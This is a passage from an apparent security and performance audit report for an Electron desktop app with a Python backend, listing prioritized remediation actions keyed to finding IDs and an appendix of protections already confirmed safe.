| 12 | Add CSP; self-host fonts; drop `ctxasset` `bypassCSP`. | S18, S19 |
| 13 | SSRF guard on the HTTP client + research fetcher. | S11, S12 |
| 14 | Validate `document_id`; quote generated-test filenames. | S6, S7 |
| 15 | Code-split the desktop renderer; cut xterm scrollback / unmount panes. | P11, P12 |
| 16 | Kill off-tab polling; cache `workspace_status` and `discover`. | P13, P8, P9 |
| 17 | Trim `/api/v1/repo` payload; fetch messages lazily. | P6 |
| 18 | Static-export the landing page; `next/font`; drop root `@xyflow/react`. | P1, P2, P3 |
| 19 | Enforce `mypy`/`ruff` + app builds in CI; add a Python lockfile. | H2, H3 |

### P2 — hardening & cleanup
| # | Action | Findings |
|---|---|---|
| 20 | Split `Repo`/`api/app.py`; dedupe retry/token/fence/CLI helpers. | A12–A16 |
| 21 | Preserve exception types in LLM adapters; log in fallbacks. | A7, A8 |
| 22 | Offload sync `Repo` calls off the event loop; fix racy supervisor state. | A10, A11 |
| 23 | Fix broken `mcp.server.mcpserver` import; delete unused helpers/dead `noqa`. | A18 |
| 24 | Add retention/GC + `VACUUM`; clean worktrees on trash. | P16 |
| 25 | Refuse non-loopback host without a token; `path.basename()` save-file default. | S5, S20 |
| 26 | Reduce `# type: ignore`; remove dead weight (`landing/`, stray copy). | A17, H4 |
| 27 | Cache asset index; build backend `--onedir`; add notarization/checksum. | P14, P15, S21 |

---

## Appendix — checked and already safe (no action)

- **Electron basics:** `contextIsolation:true`, `nodeIntegration:false`, `sandbox:true` on the
  main window and every `WebContentsView`; `webSecurity`/`allowRunningInsecureContent`/
  `webviewTag` left at secure defaults.
- **Browser view:** restricted to `http(s)`, no preload, denies camera/mic/geo/usb/serial/etc.,
  blocks non-http(s) in-page navigation, re-navigates popups in-place.
- **IPC inputs that *are* validated:** `ctx:harness-install` resolves the id through a fixed
  registry; asset IPC resolves ids through the JSON index (no traversal); PTY `cwd` is confined
  to project roots/worktrees.
- **Backend:** git wrapper uses argv (no shell); SQL is fully parameterized; YAML uses
  `safe_load`; no `pickle`/`eval`/`exec`; untrusted JSON is validated with Pydantic.
- **Secrets at the boundary:** provider keys are returned as `has_key`/`key_hint` only; error
  strings are redacted. The gap is on-disk permissions (S9), not exposure over the API.
- **HTTP clients:** all set timeouts (supervisor, LLM adapters, limits, apiclient).
- **Repo hygiene:** `.gitignore` correctly excludes all build artifacts and caches (H1).

*No application code was modified to produce this report — only this document was created.*
